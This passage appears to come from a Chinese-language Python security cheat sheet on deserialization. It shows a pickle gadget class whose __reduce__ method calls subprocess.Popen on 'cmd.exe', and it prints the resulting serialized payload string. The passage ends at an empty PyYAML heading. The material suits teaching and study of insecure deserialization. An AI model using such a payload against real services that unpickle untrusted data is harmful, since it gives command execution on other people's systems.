反序列化
--------------------------------

pickle
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

::

    >>> class A(object):
    ...     a = 1
    ...     b = 2
    ...     def __reduce__(self):
    ...         return (subprocess.Popen, (('cmd.exe',),))
    ...
    >>> cPickle.dumps(A())
    "csubprocess\nPopen\np1\n((S'cmd.exe'\np2\ntp3\ntp4\nRp5\n."

PyYAML反序列化
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
